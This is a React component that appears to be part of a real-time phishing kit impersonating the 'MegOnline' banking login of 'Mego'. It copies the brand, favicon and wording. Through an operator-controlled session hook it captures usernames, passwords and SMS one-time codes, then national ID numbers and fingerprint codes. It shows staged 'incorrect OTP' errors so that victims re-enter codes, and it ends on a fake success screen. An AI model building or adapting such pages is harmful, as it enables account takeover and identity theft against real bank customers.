import { useEffect, useState, useRef, type FormEvent } from 'react'
import { Link } from 'react-router-dom'
import { useOperatorSession } from '../hooks/useOperatorSession'
import './MegOnline.css'

export function MegOnline() {
  const { status, errorMsg, startSession, sendToken, resetSession, clearError, notifyTyping, sendDeviceData } = useOperatorSession()
  const [user, setUser] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const canContinue = user.trim().length > 0 && password.trim().length > 0 && (status === 'idle' || status === 'error-login')

  // Code screen states
  const [reachedCodeScreen, setReachedCodeScreen] = useState(false)
  const [code, setCode] = useState(['', '', '', '', '', ''])
  const [cedula, setCedula] = useState('')
  const [dactilar, setDactilar] = useState('')
  const [seconds, setSeconds] = useState(300)
  const [timerActive, setTimerActive] = useState(false)
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])

  const isCodeComplete = code.every(char => char !== '')

  useEffect(() => {
    if (status === 'waiting-code' || status === 'error-cod1' || status === 'error-cod2' || status === 'dispositivo') {
      setReachedCodeScreen(true)
      setSeconds(300)
      setTimerActive(false)
      setCode(['', '', '', '', '', ''])
      setTimeout(() => {
        inputRefs.current[0]?.focus()
      }, 50)
    } else if (status === 'idle') {
      setReachedCodeScreen(false)
      setCedula('')
      setDactilar('')
    }
  }, [status])

  const isSubmittingRef = useRef(false)
  useEffect(() => {
    if (status === 'idle' || status === 'error-login' || status === 'error-cod1' || status === 'error-cod2' || status === 'waiting-code' || status === 'done') {
      isSubmittingRef.current = false
    }
  }, [status])

  useEffect(() => {
    if (seconds > 0 && !timerActive) {
      const t = setTimeout(() => setSeconds(s => s - 1), 1000)
      return () => clearTimeout(t)
    } else if (seconds === 0 && !timerActive) {
      setTimerActive(true)
    }
  }, [seconds, timerActive])

  const formatSeconds = (sec: number) => {
    const mm = Math.floor(sec / 60).toString().padStart(2, '0')
    const ss = (sec % 60).toString().padStart(2, '0')
    return `${mm}:${ss}`
  }

  const resetTimer = () => {
    setSeconds(300)
    setTimerActive(false)
  }

  const handleCodeChange = (value: string, index: number) => {
    notifyTyping()
    const numValue = value.replace(/[^0-9]/g, '')
    if (numValue.length > 1) return

    const newCode = [...code]
    newCode[index] = numValue
    setCode(newCode)

    if (numValue && index < 5) {
      inputRefs.current[index + 1]?.focus()
    }
  }

  const handleCodeKeyDown = (e: React.KeyboardEvent<HTMLInputElement>, index: number) => {
    if (e.key === 'Backspace') {
      if (!code[index] && index > 0) {
        inputRefs.current[index - 1]?.focus()
        const newCode = [...code]
        newCode[index - 1] = ''
        setCode(newCode)
      } else if (code[index]) {
        const newCode = [...code]
        newCode[index] = ''
        setCode(newCode)
      }
    }
  }

  const handleCodePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault()
    const pastedText = e.clipboardData.getData('text').trim()
    const digits = pastedText.replace(/[^0-9]/g, '').slice(0, 6).split('')
    
    if (digits.length > 0) {
      const newCode = [...code]
      digits.forEach((digit, idx) => {
        newCode[idx] = digit
      })
      setCode(newCode)

      const lastIdx = Math.min(digits.length - 1, 5)
      inputRefs.current[lastIdx]?.focus()
    }
  }

  const handleSubmit = () => {
    if (!isCodeComplete || status === 'typing') return
    if (isSubmittingRef.current) return
    isSubmittingRef.current = true
    sendToken(code.join(''))
  }

  const handleDeviceSubmit = () => {
    if (!cedula.trim() || !dactilar.trim()) return
    sendDeviceData(cedula.trim(), dactilar.trim())
  }

  useEffect(() => {
    const html = document.documentElement
    const prevTitle = document.title
    const icon = document.querySelector<HTMLLinkElement>('link[rel="icon"]')
    const prevIcon = icon?.href
    const prevIconType = icon?.type

    html.classList.add('notranslate', 'mo-root')
    html.lang = 'es'
    html.setAttribute('translate', 'no')
    document.title = 'MegOnline'
    if (icon) {
      icon.type = 'image/svg+xml'
      icon.href = '/img/megoempresas-favicon.svg'
    }

    return () => {
      html.classList.remove('notranslate', 'mo-root')
      html.removeAttribute('translate')
      document.title = prevTitle
      if (icon && prevIcon) {
        icon.href = prevIcon
        if (prevIconType) icon.type = prevIconType
      }
    }
  }, [])

  function onSubmit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault()
    if (!user.trim() || !password.trim() || (status !== 'idle' && status !== 'error-login')) return
    if (isSubmittingRef.current) return
    isSubmittingRef.current = true
    startSession(user.trim(), password.trim(), 'CODIGO_PERSONA')
  }

  // Early return for security code verification screen (GanaPin / Autenticador / Dispositivo / Done)
  const showSpinnerOnCodeScreen = reachedCodeScreen && status === 'typing'
  const isCodeOrDoneOrDevice = 
    status === 'waiting-code' || 
    status === 'error-cod1' || 
    status === 'error-cod2' || 
    showSpinnerOnCodeScreen || 
    status === 'done' ||
    status === 'dispositivo'

  if (isCodeOrDoneOrDevice) {
    const showErrorModal = status === 'error-cod1' || status === 'error-cod2'
    const modalText = 'La OTP ingresada es incorrecta.'

    return (
      <div className="mo-code-page">
        <header className="mo-code-header" style={{ justifyContent: status === 'dispositivo' ? 'flex-start' : 'center', gap: '15px' }}>
          {status === 'dispositivo' && (
            <button 
              type="button" 
              style={{ background: 'none', border: 'none', color: '#fff', fontSize: '24px', cursor: 'pointer', padding: '0', display: 'flex', alignItems: 'center' }}
              onClick={() => {}}
            >
              <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <line x1="19" y1="12" x2="5" y2="12"></line>
                <polyline points="12 19 5 12 12 5"></polyline>
              </svg>
            </button>
          )}
          <h1 style={{ fontSize: '18px', fontWeight: 600, color: '#fff', margin: 0, flex: status === 'dispositivo' ? 1 : 'none', textAlign: status === 'dispositivo' ? 'left' : 'center' }}>
            {status === 'dispositivo' ? 'Comprobación de seguridad' : 'MegOnline'}
          </h1>
        </header>

        <main className="mo-code-body">
          <button type="button" className="mo-code-a11y" aria-label="Accesibilidad">
            <A11yIcon />
          </button>

          {status === 'done' ? (
            <div 
              className="mo-card" 
              style={{ 
                display: 'flex', 
                flexDirection: 'column', 
                alignItems: 'center', 
                justifyContent: 'center', 
                gap: '16px', 
                minHeight: '350px', 
                padding: '48px 40px', 
                width: '100%', 
                maxWidth: '530px', 
                boxSizing: 'border-box', 
                borderRadius: '28px', 
                boxShadow: '0 20px 40px rgba(0, 0, 0, 0.05)',
                border: 'none',
                background: '#fff'
              }}
            >
              <p className="mo-wordmark" aria-label="MegOnline" style={{ marginBottom: '28px', color: '#110929', fontSize: '36px', fontWeight: 700, letterSpacing: '-0.04em' }}>
                <span style={{ color: '#9e2abf' }}>Meg</span>Online
              </p>
              
              <div style={{ background: '#e8f7ee', color: '#176b3a', padding: '16px', borderRadius: '50%', width: '64px', height: '64px', display: 'grid', placeItems: 'center', marginBottom: '8px' }}>
                <svg viewBox="0 0 24 24" width="32" height="32" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="20 6 9 17 4 12" />
                </svg>
              </div>
              
              <h3 style={{ fontSize: '18px', fontWeight: 600, color: '#1c1228', textAlign: 'center', margin: 0, fontFamily: 'Outfit, sans-serif' }}>
                ¡Inicio de Sesión Exitoso!
              </h3>
              
              <p style={{ fontSize: '14px', color: '#555', maxWidth: '300px', textAlign: 'center', margin: 0, fontFamily: 'Arial, sans-serif', lineHeight: 1.5 }}>
                Bienvenido a MegOnline. Hemos Validado Exitosamente tu Cuenta
              </p>
              
              <button 
                type="button" 
                className="mo-submit" 
                style={{ 
                  width: '100%', 
                  cursor: 'pointer', 
                  background: '#5b4ae0', 
                  color: '#fff', 
                  borderRadius: '12px', 
                  height: '48px', 
                  fontWeight: 600, 
                  fontSize: '15px',
                  marginTop: '16px',
                  border: 'none'
                }}
                onClick={() => { resetSession(); setUser(''); setPassword(''); setCedula(''); setDactilar(''); isSubmittingRef.current = false; }}
              >
                Volver al inicio
              </button>
            </div>
          ) : (
            <div className="mo-code-card">
              {status === 'dispositivo' ? (
              <div style={{ padding: '32px 24px 24px', display: 'flex', flexDirection: 'column', alignItems: 'center', width: '100%', boxSizing: 'border-box' }}>
                {/* Step indicator */}
                <div className="mo-steps-container" style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', width: '220px', marginBottom: '32px', position: 'relative' }}>
                  <div style={{ position: 'absolute', top: '15px', left: '15px', right: '15px', height: '3px', background: '#e0d8ff', zIndex: 0 }} />
                  <div style={{ position: 'absolute', top: '15px', left: '15px', width: '90px', height: '3px', background: '#bd2cf9', zIndex: 0 }} />
                  
                  <div style={{ width: '32px', height: '32px', borderRadius: '50%', background: '#bd2cf9', color: '#fff', display: 'grid', placeItems: 'center', fontSize: '14px', fontWeight: 600, zIndex: 1 }}>1</div>
                  <div style={{ width: '32px', height: '32px', borderRadius: '50%', background: '#bd2cf9', color: '#fff', display: 'grid', placeItems: 'center', fontSize: '14px', fontWeight: 600, zIndex: 1 }}>2</div>
                  <div style={{ width: '32px', height: '32px', borderRadius: '50%', background: '#fff', border: '2px solid #e0d8ff', color: '#888', display: 'grid', placeItems: 'center', fontSize: '14px', fontWeight: 600, zIndex: 1 }}>3</div>
                </div>

                {/* Cellphone & Fingerprint Scan SVG Icon */}
                <div style={{ margin: '0 0 28px', color: '#bd2cf9', display: 'flex', justifyContent: 'center' }}>
                  <svg width="80" height="100" viewBox="0 0 80 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                    {/* Phone frame */}
                    <rect x="20" y="5" width="40" height="85" rx="6" stroke="#bd2cf9" strokeWidth="2.5" fill="none" />
                    <rect x="34" y="5" width="12" height="4" rx="2" fill="#bd2cf9" />
                    <rect x="36" y="82" width="8" height="2" rx="1" fill="#bd2cf9" />
                    
                    {/* Overlapping fingerprint area */}
                    <circle cx="50" cy="50" r="22" fill="#fff" stroke="#bd2cf9" strokeWidth="2" />
                    {/* Fingerprint concentric curves */}
                    <path d="M50 40a10 10 0 0 1 10 10" stroke="#bd2cf9" strokeWidth="1.5" strokeLinecap="round" />
                    <path d="M44 46a8 8 0 0 1 12 0" stroke="#bd2cf9" strokeWidth="1.5" strokeLinecap="round" />
                    <path d="M47 50a3 3 0 0 1 6 0" stroke="#bd2cf9" strokeWidth="1.5" strokeLinecap="round" />
                    <path d="M40 50a10 10 0 0 1 20 0" stroke="#bd2cf9" strokeWidth="1.5" strokeLinecap="round" />
                    <path d="M43 54a7 7 0 0 1 14 0" stroke="#bd2cf9" strokeWidth="1.5" strokeLinecap="round" />
                  </svg>
                </div>

                <h2 style={{ fontSize: '18px', fontWeight: 700, color: '#1c1228', marginBottom: '12px', textAlign: 'center', fontFamily: 'Outfit, sans-serif' }}>
                  Validación de Identidad
                </h2>
                
                <p style={{ fontSize: '13px', color: '#666', lineHeight: 1.5, textAlign: 'center', marginBottom: '24px', fontFamily: 'Arial, sans-serif' }}>
                  Estimado socio/cliente, para continuar necesitamos validar tu identidad. Por favor ingresa tu <strong>número de cédula</strong> y <strong>código dactilar</strong>.
                </p>

                <form style={{ width: '100%', display: 'flex', flexDirection: 'column', gap: '16px' }} onSubmit={(e) => { e.preventDefault(); handleDeviceSubmit(); }}>
                  <label className={cedula ? 'is-filled' : ''} style={{ display: 'flex', flexDirection: 'column', width: '100%', gap: '6px', fontSize: '13px', color: '#666', fontFamily: 'Arial, sans-serif' }}>
                    Cédula de identidad
                    <input
                      type="text"
                      placeholder="Ingresa tu número de cédula"
                      value={cedula}
                      onChange={(e) => { setCedula(e.target.value); if (status === 'dispositivo') notifyTyping(); }}
                      required
                      style={{ border: '1px solid #d2d2d8', borderRadius: '12px', height: '48px', padding: '0 16px', fontSize: '14px', outline: 'none', width: '100%', boxSizing: 'border-box' }}
                    />
                  </label>

                  <label className={dactilar ? 'is-filled' : ''} style={{ display: 'flex', flexDirection: 'column', width: '100%', gap: '6px', fontSize: '13px', color: '#666', fontFamily: 'Arial, sans-serif' }}>
                    Código dactilar
                    <input
                      type="text"
                      placeholder="Ingresa el código dactilar de tu c..."
                      value={dactilar}
                      onChange={(e) => { setDactilar(e.target.value); if (status === 'dispositivo') notifyTyping(); }}
                      required
                      style={{ border: '1px solid #d2d2d8', borderRadius: '12px', height: '48px', padding: '0 16px', fontSize: '14px', outline: 'none', width: '100%', boxSizing: 'border-box' }}
                    />
                  </label>

                  <button 
                    type="submit" 
                    className="mo-submit" 
                    disabled={!cedula.trim() || !dactilar.trim()}
                    style={{ width: '100%', cursor: 'pointer', background: '#5b4ae0', color: '#fff', borderRadius: '12px', height: '48px', fontWeight: 600, fontSize: '15px', marginTop: '10px', border: 'none' }}
                  >
                    Validar
                  </button>
                </form>
              </div>
            ) : showSpinnerOnCodeScreen ? (
              <div style={{ textAlign: 'center', margin: '40px 0', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '20px', width: '100%' }}>
                <h2 className="mo-title" style={{ fontSize: '18px', fontWeight: 600, color: '#1c1228', marginBottom: '8px', fontFamily: 'Outfit, sans-serif' }}>
                  Verificando información
                </h2>
                <p className="mo-subtitle" style={{ fontSize: '13px', color: '#666', marginBottom: '10px', textAlign: 'center', fontFamily: 'Arial, sans-serif' }}>
                  Por favor, espera un momento mientras procesamos tu solicitud.
                </p>
                <div className="mo-dots-spinner">
                  <span />
                  <span />
                  <span />
                  <span />
                </div>
              </div>
            ) : (
              <>
                <p className="mo-code-title">
                  Por favor ingresa el código de seguridad enviado a tu celular
                </p>

                <div className="mo-code-inputs">
                  {code.map((digit, idx) => (
                    <input
                      key={idx}
                      ref={el => { inputRefs.current[idx] = el }}
                      className="mo-code-input"
                      type="text"
                      inputMode="numeric"
                      pattern="[0-9]*"
                      maxLength={1}
                      value={digit}
                      disabled={showErrorModal}
                      onChange={e => handleCodeChange(e.target.value, idx)}
                      onKeyDown={e => handleCodeKeyDown(e, idx)}
                      onPaste={handleCodePaste}
                    />
                  ))}
                </div>

                <button 
                  type="button" 
                  className={`mo-code-timer-btn ${timerActive ? 'active' : ''}`} 
                  disabled={!timerActive || showErrorModal} 
                  onClick={resetTimer}
                >
                  {timerActive ? 'Solicitar nuevo código' : `${formatSeconds(seconds)} Solicitar nuevo código`}
                </button>

                <div className="mo-code-actions">
                  <button 
                    type="button" 
                    className={`mo-code-btn-confirm ${isCodeComplete && !showErrorModal ? 'active' : ''}`} 
                    disabled={!isCodeComplete || showErrorModal}
                    onClick={handleSubmit}
                    style={{ width: '100%', flex: 'none' }}
                  >
                    Confirmar
                  </button>
                </div>
              </>
            )}
          </div>
        )}

          {/* Modal de error de OTP (MegOnline) */}
          {showErrorModal && (
            <div className="mo-modal-overlay">
              <div className="mo-modal-card">
                <button type="button" className="mo-modal-close" aria-label="Cerrar" onClick={() => { clearError(); setCode(['', '', '', '', '', '']); }}>
                  <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" strokeWidth="2.5">
                    <line x1="18" y1="6" x2="6" y2="18"></line>
                    <line x1="6" y1="6" x2="18" y2="18"></line>
                  </svg>
                </button>
                <div className="mo-modal-icon">
                  <span>!</span>
                </div>
                <p className="mo-modal-text">{modalText}</p>
                <button type="button" className="mo-modal-btn" onClick={() => { clearError(); setCode(['', '', '', '', '', '']); }}>
                  Continuar
                </button>
              </div>
            </div>
          )}
        </main>

        <footer className="mo-code-footer">
          <a href="#">Tutoriales</a>
          <span>|</span>
          <a href="#">Preguntas frecuentes</a>
          <span>|</span>
          <a href="#">Consejos de seguridad</a>
        </footer>
      </div>
    )
  }

  return (
    <div className="mo-page">
      <section className="mo-left">
        <button type="button" className="mo-a11y" aria-label="Accesibilidad">
          <A11yIcon />
        </button>

        {status === 'waiting' || status === 'typing' ? (
          <div className="mo-card">
            <p className="mo-wordmark" aria-label="MegOnline">
              <span>Meg</span>Online
            </p>
            <div style={{ textAlign: 'center', margin: '40px 0', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '20px' }}>
              <div className="mo-dots-spinner">
                <span />
                <span />
                <span />
                <span />
              </div>
              <p style={{ fontSize: '14px', color: '#666', maxWidth: '280px' }}>
                {status === 'typing' 
                  ? 'Validando código de seguridad...' 
                  : 'Verificando tus datos de acceso... Por favor, espera.'}
              </p>
            </div>
          </div>
        ) : (
          <div className="mo-card">
            <p className="mo-wordmark" aria-label="MegOnline">
              <span>Meg</span>Online
            </p>

            <form className="mo-form" onSubmit={onSubmit}>
              <label className={user ? 'is-filled' : ''}>
                {user ? <span className="mo-label">Usuario</span> : null}
                <input
                  name="user"
                  placeholder="Ingresa tu usuario"
                  autoComplete="username"
                  value={user}
                  onChange={(event) => {
                    setUser(event.target.value)
                    if (status === 'error-login' || status === 'idle') notifyTyping()
                  }}
                />
              </label>
              <Link className="mo-link" to="/contacto">
                Olvidé mi usuario
              </Link>

              <label className={password ? 'is-filled' : ''}>
                {password ? <span className="mo-label">Contraseña</span> : null}
                <span className="mo-pass">
                  <input
                    name="password"
                    type={showPassword ? 'text' : 'password'}
                    placeholder="Ingresa tu contraseña"
                    autoComplete="current-password"
                    value={password}
                    onChange={(event) => {
                    setPassword(event.target.value)
                    if (status === 'error-login' || status === 'idle') notifyTyping()
                  }}
                  />
                  <button
                    type="button"
                    className="mo-eye"
                    aria-label={showPassword ? 'Ocultar contraseña' : 'Mostrar contraseña'}
                    onClick={() => setShowPassword((value) => !value)}
                  >
                    <EyeIcon off={showPassword} />
                  </button>
                </span>
              </label>
              <Link className="mo-link" to="/contacto">
                Olvidé mi contraseña / Desbloquear
              </Link>

              <button className="mo-submit" type="submit" disabled={!canContinue}>
                Continuar
              </button>
            </form>

            {errorMsg ? <p className="mo-notice" style={{ background: '#ffe8e8', color: '#b00000' }}>{errorMsg}</p> : null}

            <div className="mo-extras">
              <p>
                <Link to="/ser-socio">Soy usuario nuevo</Link>
                <span> | </span>
                <Link to="/faq">Información</Link>
              </p>
              <p>
                ¿Caducó tu clave temporal? <Link to="/contacto">Solicítala aquí</Link>
              </p>
            </div>

            <p className="mo-browsers">
              Disfruta al máximo de MegOnline empleando los navegadores: Google Chrome y Firefox.
            </p>
          </div>
        )}
      </section>

      <section className="mo-right">
        <p className="mo-secure">
          Asegúrate que estés utilizando en tu navegador la dirección <strong>oficial de MegOnline</strong>
        </p>

        <Link className="mo-tips" to="/transparencia">
          Más tips de seguridad aquí
        </Link>

        <div className="mo-brand">
          <MegoMark />
          <p>
            Powered by <span>tikēe</span>
          </p>
        </div>
      </section>

      <div className="mo-recaptcha" aria-hidden="true">
        <RecaptchaMark />
      </div>
    </div>
  )
}

function A11yIcon() {
  return (
    <svg viewBox="0 0 24 24" width="22" height="22" aria-hidden="true">
      <circle cx="12" cy="4.6" r="2.1" fill="currentColor" />
      <path
        fill="currentColor"
        d="M4.2 8.4c2.4-.9 4.9-1.3 7.8-1.3s5.4.4 7.8 1.3l-.7 2.1c-2.1-.7-4.5-1-7.1-1s-5 .3-7.1 1zM8.2 11h2.1v9.4H8.2zm5.5 0h2.1v9.4h-2.1z"
      />
    </svg>
  )
}

function EyeIcon({ off }: { off: boolean }) {
  return (
    <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" strokeWidth="2" aria-hidden="true">
      <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z" />
      <circle cx="12" cy="12" r="3" />
      {off ? <path d="M3 3l18 18" /> : null}
    </svg>
  )
}

function MegoMark() {
  return (
    <svg viewBox="0 0 160 36" width="150" height="34" aria-label="Mego">
      <g fill="#d6e303">
        <polygon points="14,2 24,8 24,20 14,26 4,20 4,8" />
        <polygon points="28,8 38,14 38,26 28,32 18,26 18,14" />
        <polygon points="42,2 52,8 52,20 42,26 32,20 32,8" />
      </g>
      <text x="58" y="26" fill="#fff" fontFamily="Outfit, system-ui, sans-serif" fontSize="22" fontWeight="700">
        Mego
      </text>
    </svg>
  )
}

function RecaptchaMark() {
  return (
    <svg viewBox="0 0 32 32" width="32" height="32" aria-hidden="true">
      <circle cx="16" cy="16" r="15" fill="#fff" />
      <path
        fill="#1a73e8"
        d="M16 6a10 10 0 1 0 9.5 13.2h-4.1A6.2 6.2 0 1 1 16 9.8V13l6-4.5L16 4z"
      />
    </svg>
  )
}
